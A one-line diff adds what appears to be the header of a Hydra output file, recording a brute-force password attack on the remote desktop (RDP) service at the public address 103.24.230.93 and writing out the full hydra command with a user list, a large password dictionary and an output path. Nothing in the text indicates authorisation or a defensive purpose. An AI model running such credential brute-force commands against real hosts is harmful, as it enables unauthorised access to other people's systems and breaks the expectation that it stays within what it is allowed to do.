@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-28 07:13:14 on 103.24.230.93 rdp (hydra -L /tmp/rdp_users.txt -P /tmp/big_dict.txt -t 2 -w 3 -o /tmp/rdpbig.txt rdp://103.24.230.93)
